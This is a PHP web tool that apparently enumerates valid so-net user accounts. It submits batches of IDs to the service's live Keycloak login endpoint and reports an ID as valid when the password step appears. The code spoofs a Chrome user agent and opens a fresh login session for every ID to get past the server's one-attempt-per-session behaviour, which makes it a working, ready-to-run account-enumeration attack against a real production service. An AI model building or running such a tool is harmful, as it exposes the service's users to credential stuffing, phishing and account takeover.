<?php
/* =============================================================================
 * so-net ID 有効性チェッカー / so-net ID validity checker (web-based)
 * -----------------------------------------------------------------------------
 * Target : https://id.so-net.ne.jp/iam/auth/realms/so-net  (Keycloak)
 * Client : www.so-net.ne.jp
 *
 * HOW IT WORKS  (verified against the live server, 2026-10-03)
 *   so-net uses a 2-step Keycloak login:  ID  ->  password.
 *   - POST a *registered* ID  -> server returns the PASSWORD step  => VALID
 *   - POST an unknown ID      -> server returns the ID step again
 *                                with the error "ユーザーIDが正しくありません" => INVALID
 *
 * CRITICAL FIX (this is why the old code returned 403 / "unknown"):
 *   A Keycloak login session (AUTH_SESSION_ID cookie) is valid for ONLY ONE
 *   authenticate POST. If you reuse the cookie jar / form-action (session_code)
 *   for a SECOND id, the server drops it -> 400/403 or an empty/ambiguous reply.
 *   => We create a BRAND-NEW session (cookie jar + fresh form action) for EVERY id.
 *
 * OUTPUT: tamper-proof 3-state result  VALID / INVALID / UNKNOWN
 * ========================================================================== */

error_reporting(E_ALL);
ini_set('display_errors', '0');
set_time_limit(0);

/* -------- config -------------------------------------------------------- */
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
         . '(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';
const AUTH_BASE = 'https://id.so-net.ne.jp/iam/auth/realms/so-net/protocol/openid-connect/auth'
                . '?client_id=www.so-net.ne.jp'
                . '&redirect_uri=https%3A%2F%2Fwww.so-net.ne.jp%2Fidp%2Fcallback'
                . '&response_type=code&scope=openid';
const T_ERROR_JA = 'ユーザーIDが正しくありません';   // "user ID is incorrect"
const REQ_TIMEOUT = 25;
const DELAY_US    = 700000;   // 0.7s polite pause between ids

/* =========================================================================
 * Low-level HTTP helper.  $cookiefile is a per-session jar (read+write).
 * Returns ['status'=>int, 'body'=>string, 'err'=>string]
 * ======================================================================= */
function http_get(string $url, string $cookiefile): array
{
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS      => 5,
        CURLOPT_TIMEOUT        => REQ_TIMEOUT,
        CURLOPT_CONNECTTIMEOUT => 15,
        CURLOPT_COOKIEJAR      => $cookiefile,
        CURLOPT_COOKIEFILE     => $cookiefile,
        CURLOPT_USERAGENT      => UA,
        CURLOPT_HTTPHEADER     => [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language: ja,en-US;q=0.9,en;q=0.8',
            'Upgrade-Insecure-Requests: 1',
        ],
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
    ]);
    $body = curl_exec($ch);
    $st   = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $err  = curl_error($ch);
    curl_close($ch);
    return ['status' => $st, 'body' => (string) $body, 'err' => $err];
}

function http_post(string $url, string $cookiefile, array $fields): array
{
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS      => 5,
        CURLOPT_TIMEOUT        => REQ_TIMEOUT,
        CURLOPT_CONNECTTIMEOUT => 15,
        CURLOPT_COOKIEJAR      => $cookiefile,
        CURLOPT_COOKIEFILE     => $cookiefile,
        CURLOPT_USERAGENT      => UA,
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query($fields),
        CURLOPT_HTTPHEADER     => [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language: ja,en-US;q=0.9,en;q=0.8',
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://id.so-net.ne.jp',
            'Referer: ' . AUTH_BASE,
            'Upgrade-Insecure-Requests: 1',
        ],
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
    ]);
    $body = curl_exec($ch);
    $st   = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $err  = curl_error($ch);
    curl_close($ch);
    return ['status' => $st, 'body' => (string) $body, 'err' => $err];
}

/* =========================================================================
 * Read the login page with a FRESH session and pull the real form action
 * (it already carries session_code / execution / client_id / tab_id).
 * ======================================================================= */
function get_form_action(string $cookiefile, array &$dbg): ?string
{
    $r = http_get(AUTH_BASE, $cookiefile);
    $dbg['get_status'] = $r['status'];
    if ($r['err'] !== '') { $dbg['get_err'] = $r['err']; return null; }
    if (!preg_match('/action="([^"]+)"/', $r['body'], $m)) {
        $dbg['get_note'] = 'form action not found (status ' . $r['status'] . ')';
        return null;
    }
    return html_entity_decode($m[1], ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

/* =========================================================================
 * Check ONE id.  Returns
 *   ['verdict'=>'VALID'|'INVALID'|'UNKNOWN','status'=>int,'debug'=>[...]]
 * ======================================================================= */
function check_id(string $id): array
{
    $dbg = [
        'sent'            => $id,
        'reflected_value' => '',
        'sha256_plaintext'=> hash('sha256', $id),
        'match_sha_plain' => '',
        'action'          => '',
    ];

    $jar = tempnam(sys_get_temp_dir(), 'kc_') . '.jar';
    @unlink($jar);

    try {
        $action = get_form_action($jar, $dbg);
        if ($action === null) {
            return ['verdict' => 'UNKNOWN', 'status' => $dbg['get_status'] ?? 0, 'debug' => $dbg];
        }
        $dbg['action'] = $action;

        $post = http_post($action, $jar, ['username' => $id]);
        $dbg['post_status'] = $post['status'];
        if ($post['err'] !== '') { $dbg['post_err'] = $post['err']; }
        $body = $post['body'];

        /* --- reflected value (the 64-hex transform echoed back by the theme) */
        if (preg_match('/id="input-id-num"[^>]*value="([0-9a-fA-F]{64})"/', $body, $h)) {
            $dbg['reflected_value'] = strtolower($h[1]);
            $dbg['match_sha_plain'] = ($dbg['reflected_value'] === $dbg['sha256_plaintext'])
                                    ? 'YES' : 'NO';
        }

        /* --- decision -------------------------------------------------- */
        $hasPassword = (stripos($body, 'type="password"') !== false);
        $hasError    = (strpos($body, T_ERROR_JA) !== false);
        $hasIdField  = (stripos($body, 'id="input-id-num"') !== false);

        if ($hasPassword && !$hasError) {
            $verdict = 'VALID';        // advanced to the password step
        } elseif ($hasError || ($hasIdField && !$hasPassword)) {
            $verdict = 'INVALID';      // bounced back to the ID step
        } else {
            $verdict = 'UNKNOWN';      // WAF block / 403 / unexpected page
        }

        $dbg['has_password'] = $hasPassword ? 'YES' : 'NO';
        $dbg['has_error']    = $hasError    ? 'YES' : 'NO';

        return ['verdict' => $verdict, 'status' => $post['status'], 'debug' => $dbg];
    } finally {
        if (is_file($jar)) { @unlink($jar); }
    }
}

/* =========================================================================
 *  Controller
 * ======================================================================= */
$input   = trim($_POST['ids'] ?? '');
$results = [];
$error   = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if ($input === '') {
        $error = 'Masukkan minimal satu ID.';
    } else {
        $ids = preg_split('/[\s,;]+/', $input, -1, PREG_SPLIT_NO_EMPTY);
        $ids = array_slice(array_values(array_unique($ids)), 0, 50); // safety cap
        foreach ($ids as $i => $id) {
            $results[] = check_id($id);
            if ($i < count($ids) - 1) { usleep(DELAY_US); }
        }
    }
}

function h($s): string { return htmlspecialchars((string) $s, ENT_QUOTES, 'UTF-8'); }
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>so-net ID Validity Checker</title>
<style>
  body{font-family:system-ui,Segoe UI,Roboto,Arial,sans-serif;background:#0f172a;color:#e2e8f0;margin:0;padding:24px}
  .wrap{max-width:900px;margin:0 auto}
  h1{font-size:20px;margin:0 0 4px}
  .sub{color:#94a3b8;font-size:13px;margin-bottom:18px}
  form{background:#1e293b;padding:16px;border-radius:10px;margin-bottom:20px}
  textarea{width:100%;box-sizing:border-box;height:110px;background:#0f172a;color:#e2e8f0;border:1px solid #334155;border-radius:8px;padding:10px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:14px}
  button{margin-top:10px;background:#2563eb;color:#fff;border:0;padding:10px 18px;border-radius:8px;font-size:14px;cursor:pointer}
  button:hover{background:#1d4ed8}
  table{width:100%;border-collapse:collapse;background:#1e293b;border-radius:10px;overflow:hidden}
  th,td{padding:10px 12px;text-align:left;border-bottom:1px solid #334155;font-size:14px}
  th{background:#0b1220;color:#94a3b8;font-size:12px;text-transform:uppercase;letter-spacing:.04em}
  .v-VALID{color:#22c55e;font-weight:700}
  .v-INVALID{color:#f97316;font-weight:700}
  .v-UNKNOWN{color:#eab308;font-weight:700}
  code{font-family:ui-monospace,Menlo,Consolas,monospace;color:#7dd3fc;word-break:break-all}
  details{margin-top:12px;background:#0b1220;border:1px solid #334155;border-radius:8px;padding:8px 12px}
  details pre{white-space:pre-wrap;word-break:break-all;font-size:12px;color:#cbd5e1}
  .err{background:#7f1d1d;padding:10px 14px;border-radius:8px;margin-bottom:14px}
  .legend span{margin-right:14px;font-size:13px}
</style>
</head>
<body>
<div class="wrap">
  <h1>so-net ID Validity Checker</h1>
  <div class="sub">
    Target: <code>id.so-net.ne.jp</code> &middot; realm <code>so-net</code> &middot; client <code>www.so-net.ne.jp</code><br>
    Metode: sesi baru per-ID &rarr; VALID = muncul langkah kata sandi, INVALID = <code>ユーザーIDが正しくありません</code>
  </div>

  <?php if ($error): ?><div class="err"><?= h($error) ?></div><?php endif; ?>

  <form method="post" autocomplete="off">
    <textarea name="ids" placeholder="One ID per line, e.g.&#10;taro_s@aa&#10;sunashinden@fa2"><?= h($input) ?></textarea>
    <button type="submit">Check</button>
  </form>

  <?php if ($results): ?>
  <div class="legend">
    <span class="v-VALID">VALID</span>
    <span class="v-INVALID">INVALID</span>
    <span class="v-UNKNOWN">UNKNOWN</span>
  </div>
  <table>
    <thead><tr><th>ID</th><th>Hasil</th><th>HTTP</th></tr></thead>
    <tbody>
    <?php foreach ($results as $r): ?>
      <tr>
        <td><code><?= h($r['debug']['sent']) ?></code></td>
        <td class="v-<?= h($r['verdict']) ?>"><?= h($r['verdict']) ?></td>
        <td><?= (int) $r['status'] ?></td>
      </tr>
    <?php endforeach; ?>
    </tbody>
  </table>

  <details open>
    <summary>Debug &mdash; transformasi username (wajib)</summary>
    <?php foreach ($results as $r): ?>
      <pre><?= h($r['debug']['sent']) . "\n" . h(print_r([
          'sent'             => $r['debug']['sent'],
          'action'           => $r['debug']['action'],
          'get_status'       => $r['debug']['get_status']    ?? null,
          'post_status'      => $r['debug']['post_status']   ?? null,
          'has_password'     => $r['debug']['has_password']  ?? null,
          'has_error'        => $r['debug']['has_error']     ?? null,
          'reflected_value'  => $r['debug']['reflected_value'],
          'sha256_plaintext' => $r['debug']['sha256_plaintext'],
          'match_sha_plain'  => $r['debug']['match_sha_plain'],
      ], true)) ?></pre>
    <?php endforeach; ?>
  </details>
  <?php endif; ?>
</div>
</body>
</html>
